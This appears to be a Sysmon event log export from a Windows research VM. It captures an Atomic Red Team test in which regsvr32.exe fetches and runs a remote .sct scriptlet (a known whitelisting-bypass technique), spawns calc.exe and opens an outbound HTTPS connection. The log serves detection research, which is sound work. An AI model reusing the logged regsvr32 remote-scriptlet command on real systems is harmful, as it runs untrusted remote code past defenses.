<sysmonview>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>16</EventID><Version>3</Version><Level>4</Level><Task>16</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:37.148751700Z'/><EventRecordID>13998</EventRecordID><Correlation/><Execution ProcessID='9092' ThreadID='6996'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-21-520058249-2399941203-3078195291-1001'/></System><EventData><Data Name='UtcTime'>2018-08-11 22:05:37.133</Data><Data Name='Configuration'>C:\Users\User\Desktop\sos_proc.xml</Data><Data Name='ConfigurationFileHash'>SHA1=7045D7BF3A9C908A03847FC7AB48948100F49685</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:37.150165800Z'/><EventRecordID>13999</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:37.133</Data><Data Name='ProcessGuid'>{800A29D4-5DB1-5B6F-0000-00105F2D4902}</Data><Data Name='ProcessId'>9092</Data><Data Name='Image'>C:\Users\User\Desktop\Sysmon64.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:42.894574400Z'/><EventRecordID>14000</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:42.863</Data><Data Name='ProcessGuid'>{800A29D4-5DB6-5B6F-0000-00104F3E4902}</Data><Data Name='ProcessId'>6156</Data><Data Name='Image'>C:\Windows\System32\regsvr32.exe</Data><Data Name='FileVersion'>10.0.17134.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Microsoft(C) Register Server</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='CommandLine'>regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll</Data><Data Name='CurrentDirectory'>C:\Users\User\Desktop\sysmon_research\</Data><Data Name='User'>WINDEV1806EVAL\User</Data><Data Name='LogonGuid'>{800A29D4-6F8A-5B66-0000-002083C90600}</Data><Data Name='LogonId'>0x6c983</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=D78B75FC68247E8A63ACBA846182740E,SHA256=12E08492893DBCE4C120D69205C82C32C1AC556D2C244B3B536018A5A274355E</Data><Data Name='ParentProcessGuid'>{800A29D4-CE92-5B66-0000-0010F9265601}</Data><Data Name='ParentProcessId'>7576</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" </Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:42.894655300Z'/><EventRecordID>14001</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:42.859</Data><Data Name='SourceProcessGUID'>{800A29D4-CE92-5B66-0000-0010F9265601}</Data><Data Name='SourceProcessId'>7576</Data><Data Name='SourceThreadId'>7420</Data><Data Name='SourceImage'>C:\Windows\system32\cmd.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DB6-5B6F-0000-00104F3E4902}</Data><Data Name='TargetProcessId'>6156</Data><Data Name='TargetImage'>C:\Windows\system32\regsvr32.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9b6e4|C:\Windows\System32\KERNELBASE.dll+3b602|C:\Windows\System32\KERNELBASE.dll+68966|C:\Windows\System32\KERNEL32.DLL+1a103|C:\Windows\system32\cmd.exe+b648|C:\Windows\system32\cmd.exe+1422b|C:\Windows\system32\cmd.exe+103ce|C:\Windows\system32\cmd.exe+10765|C:\Windows\system32\cmd.exe+1d29b|C:\Windows\system32\cmd.exe+17309|C:\Windows\System32\KERNEL32.DLL+13034|C:\Windows\SYSTEM32\ntdll.dll+71431</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:42.894931300Z'/><EventRecordID>14002</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:42.859</Data><Data Name='SourceProcessGUID'>{800A29D4-8B72-5B66-0000-001036640000}</Data><Data Name='SourceProcessId'>480</Data><Data Name='SourceThreadId'>500</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DB6-5B6F-0000-00104F3E4902}</Data><Data Name='TargetProcessId'>6156</Data><Data Name='TargetImage'>C:\Windows\system32\regsvr32.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9a374|C:\Windows\system32\basesrv.DLL+2e9a|C:\Windows\SYSTEM32\CSRSRV.dll+5aa6|C:\Windows\SYSTEM32\ntdll.dll+7143f</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:44.132831200Z'/><EventRecordID>14003</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:44.119</Data><Data Name='ProcessGuid'>{800A29D4-5DB8-5B6F-0000-0010BA4C4902}</Data><Data Name='ProcessId'>7868</Data><Data Name='Image'>C:\Windows\System32\calc.exe</Data><Data Name='FileVersion'>10.0.17134.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Calculator</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='CommandLine'>"C:\Windows\System32\calc.exe" </Data><Data Name='CurrentDirectory'>C:\Users\User\Desktop\sysmon_research\</Data><Data Name='User'>WINDEV1806EVAL\User</Data><Data Name='LogonGuid'>{800A29D4-6F8A-5B66-0000-002083C90600}</Data><Data Name='LogonId'>0x6c983</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=AFAF2CDF9981342C494B28630608F74A,SHA256=284674A806BCBE692C76761BAAF21327638DE0C7135BFB06953648BE7D661FBD</Data><Data Name='ParentProcessGuid'>{800A29D4-5DB6-5B6F-0000-00104F3E4902}</Data><Data Name='ParentProcessId'>6156</Data><Data Name='ParentImage'>C:\Windows\System32\regsvr32.exe</Data><Data Name='ParentCommandLine'>regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:44.132914600Z'/><EventRecordID>14004</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:44.108</Data><Data Name='SourceProcessGUID'>{800A29D4-5DB6-5B6F-0000-00104F3E4902}</Data><Data Name='SourceProcessId'>6156</Data><Data Name='SourceThreadId'>6404</Data><Data Name='SourceImage'>C:\Windows\system32\regsvr32.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DB8-5B6F-0000-0010BA4C4902}</Data><Data Name='TargetProcessId'>7868</Data><Data Name='TargetImage'>C:\Windows\System32\calc.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9b6e4|C:\Windows\System32\KERNELBASE.dll+3b602|C:\Windows\System32\KERNELBASE.dll+68966|C:\Windows\System32\KERNEL32.DLL+1a103|C:\Windows\System32\windows.storage.dll+13891a|C:\Windows\System32\windows.storage.dll+13842a|C:\Windows\System32\windows.storage.dll+138600|C:\Windows\System32\windows.storage.dll+1399cb|C:\Windows\System32\windows.storage.dll+13809e|C:\Windows\System32\windows.storage.dll+13af53|C:\Windows\System32\windows.storage.dll+13b448|C:\Windows\System32\windows.storage.dll+13a7c4|C:\Windows\System32\SHELL32.dll+2c4c6|C:\Windows\System32\SHELL32.dll+2c33e|C:\Windows\System32\SHELL32.dll+982ae|C:\Windows\System32\shcore.dll+33fb5|C:\Windows\System32\KERNEL32.DLL+13034|C:\Windows\SYSTEM32\ntdll.dll+71431</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:44.133140800Z'/><EventRecordID>14005</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:44.108</Data><Data Name='SourceProcessGUID'>{800A29D4-8B72-5B66-0000-001036640000}</Data><Data Name='SourceProcessId'>480</Data><Data Name='SourceThreadId'>1860</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DB8-5B6F-0000-0010BA4C4902}</Data><Data Name='TargetProcessId'>7868</Data><Data Name='TargetImage'>C:\Windows\System32\calc.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9a374|C:\Windows\system32\basesrv.DLL+2e9a|C:\Windows\SYSTEM32\CSRSRV.dll+5aa6|C:\Windows\SYSTEM32\ntdll.dll+7143f</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:44.270141700Z'/><EventRecordID>14006</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:44.239</Data><Data Name='SourceProcessGUID'>{800A29D4-8B73-5B66-0000-0010258C0000}</Data><Data Name='SourceProcessId'>768</Data><Data Name='SourceThreadId'>940</Data><Data Name='SourceImage'>C:\Windows\system32\svchost.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DB8-5B6F-0000-0010B3544902}</Data><Data Name='TargetProcessId'>9480</Data><Data Name='TargetImage'>C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1806.1821.0_x64__8wekyb3d8bbwe\Calculator.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9b6e4|C:\Windows\System32\KERNELBASE.dll+3b602|C:\Windows\System32\KERNELBASE.dll+6e333|C:\Windows\System32\KERNEL32.DLL+1b03f|c:\windows\system32\rpcss.dll+19530|c:\windows\system32\rpcss.dll+9499|C:\Windows\System32\RPCRT4.dll+746f3|C:\Windows\System32\RPCRT4.dll+22829|C:\Windows\System32\RPCRT4.dll+2093a|C:\Windows\System32\RPCRT4.dll+f914|C:\Windows\System32\RPCRT4.dll+ea78|C:\Windows\System32\RPCRT4.dll+f2cb|C:\Windows\System32\RPCRT4.dll+18506|C:\Windows\System32\RPCRT4.dll+18f0c|C:\Windows\System32\RPCRT4.dll+14d6d|C:\Windows\System32\RPCRT4.dll+1646d|C:\Windows\System32\RPCRT4.dll+39318|C:\Windows\SYSTEM32\ntdll.dll+20c8e|C:\Windows\SYSTEM32\ntdll.dll+1f578|C:\Windows\System32\KERNEL32.DLL+13034|C:\Windows\SYSTEM32\ntdll.dll+71431</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:44.270200200Z'/><EventRecordID>14007</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:44.239</Data><Data Name='SourceProcessGUID'>{800A29D4-8B6F-5B66-0000-0010175F0000}</Data><Data Name='SourceProcessId'>400</Data><Data Name='SourceThreadId'>412</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DB8-5B6F-0000-0010B3544902}</Data><Data Name='TargetProcessId'>9480</Data><Data Name='TargetImage'>C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1806.1821.0_x64__8wekyb3d8bbwe\Calculator.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9a374|C:\Windows\system32\basesrv.DLL+2e9a|C:\Windows\SYSTEM32\CSRSRV.dll+5aa6|C:\Windows\SYSTEM32\ntdll.dll+7143f</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:44.281895200Z'/><EventRecordID>14008</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:44.265</Data><Data Name='SourceProcessGUID'>{800A29D4-8B72-5B66-0000-001036640000}</Data><Data Name='SourceProcessId'>480</Data><Data Name='SourceThreadId'>588</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DB8-5B6F-0000-0010B3544902}</Data><Data Name='TargetProcessId'>9480</Data><Data Name='TargetImage'>C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1806.1821.0_x64__8wekyb3d8bbwe\Calculator.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9af44|C:\Windows\SYSTEM32\CSRSRV.dll+1b90|C:\Windows\SYSTEM32\CSRSRV.dll+5f90|C:\Windows\SYSTEM32\ntdll.dll+7143f</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:44.321512500Z'/><EventRecordID>14009</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='9992'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-05 10:42:24.957</Data><Data Name='ProcessGuid'>{800A29D4-5DB6-5B6F-0000-00104F3E4902}</Data><Data Name='ProcessId'>6156</Data><Data Name='Image'>C:\Windows\System32\regsvr32.exe</Data><Data Name='User'>WINDEV1806EVAL\User</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.2.15</Data><Data Name='SourceHostname'>WinDev1806Eval.gateway</Data><Data Name='SourcePort'>50579</Data><Data Name='SourcePortName'></Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>151.101.28.133</Data><Data Name='DestinationHostname'></Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:46.101581700Z'/><EventRecordID>14010</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:46.081</Data><Data Name='SourceProcessGUID'>{800A29D4-8B73-5B66-0000-0010258C0000}</Data><Data Name='SourceProcessId'>768</Data><Data Name='SourceThreadId'>5724</Data><Data Name='SourceImage'>C:\Windows\system32\svchost.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DBA-5B6F-0000-00103C814902}</Data><Data Name='TargetProcessId'>5028</Data><Data Name='TargetImage'>C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10325.20091.0_x64__8wekyb3d8bbwe\HxTsr.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9b6e4|C:\Windows\System32\KERNELBASE.dll+3b602|C:\Windows\System32\KERNELBASE.dll+6e333|C:\Windows\System32\KERNEL32.DLL+1b03f|c:\windows\system32\rpcss.dll+19530|c:\windows\system32\rpcss.dll+9499|C:\Windows\System32\RPCRT4.dll+746f3|C:\Windows\System32\RPCRT4.dll+22829|C:\Windows\System32\RPCRT4.dll+2093a|C:\Windows\System32\RPCRT4.dll+f914|C:\Windows\System32\RPCRT4.dll+ea78|C:\Windows\System32\RPCRT4.dll+f2cb|C:\Windows\System32\RPCRT4.dll+18506|C:\Windows\System32\RPCRT4.dll+18f0c|C:\Windows\System32\RPCRT4.dll+14d6d|C:\Windows\System32\RPCRT4.dll+1646d|C:\Windows\System32\RPCRT4.dll+39318|C:\Windows\SYSTEM32\ntdll.dll+20c8e|C:\Windows\SYSTEM32\ntdll.dll+1f578|C:\Windows\System32\KERNEL32.DLL+13034|C:\Windows\SYSTEM32\ntdll.dll+71431</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:46.101640800Z'/><EventRecordID>14011</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:46.081</Data><Data Name='SourceProcessGUID'>{800A29D4-8B6F-5B66-0000-0010175F0000}</Data><Data Name='SourceProcessId'>400</Data><Data Name='SourceThreadId'>412</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DBA-5B6F-0000-00103C814902}</Data><Data Name='TargetProcessId'>5028</Data><Data Name='TargetImage'>C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10325.20091.0_x64__8wekyb3d8bbwe\HxTsr.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9a374|C:\Windows\system32\basesrv.DLL+2e9a|C:\Windows\SYSTEM32\CSRSRV.dll+5aa6|C:\Windows\SYSTEM32\ntdll.dll+7143f</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-11T22:05:46.102829700Z'/><EventRecordID>14012</EventRecordID><Correlation/><Execution ProcessID='3232' ThreadID='4532'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1806Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2018-08-11 22:05:46.081</Data><Data Name='SourceProcessGUID'>{800A29D4-8B72-5B66-0000-001036640000}</Data><Data Name='SourceProcessId'>480</Data><Data Name='SourceThreadId'>500</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{800A29D4-5DBA-5B6F-0000-00103C814902}</Data><Data Name='TargetProcessId'>5028</Data><Data Name='TargetImage'>C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10325.20091.0_x64__8wekyb3d8bbwe\HxTsr.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9af44|C:\Windows\SYSTEM32\CSRSRV.dll+1b90|C:\Windows\SYSTEM32\CSRSRV.dll+5f90|C:\Windows\SYSTEM32\ntdll.dll+7143f</Data></EventData></Event>
</sysmonview>
